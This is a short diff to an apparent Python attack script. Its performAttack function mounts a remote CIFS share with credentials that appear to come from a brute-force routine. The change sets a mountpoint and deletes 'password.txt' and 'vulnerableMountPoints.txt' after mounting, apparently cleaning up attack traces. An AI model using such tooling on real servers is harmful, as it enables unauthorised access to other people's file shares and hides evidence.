@@ -70,9 +70,12 @@ def performAttack(location, serverIP, username, password=None):
 			print ("remote filesystem " + serverIP + "/" + mountpoint + " is mounted at " + tempLocation)
 	else:
 		os.mkdir(location)
+		mountpoint = mountpoints[0]
 		mountArgs = ["mount", "-t", "cifs", "-o", "username=" + username + ",password=" + password, "//" + serverIP + "/" + mountpoint, location]
 		call(mountArgs)
 		print ("remote filesystem " + serverIP + "/" + mountpoint + " is mounted at " + location)
+	os.remove("password.txt")
+	os.remove("vulnerableMountPoints.txt")
 		
 
 def bruteForcePassword():
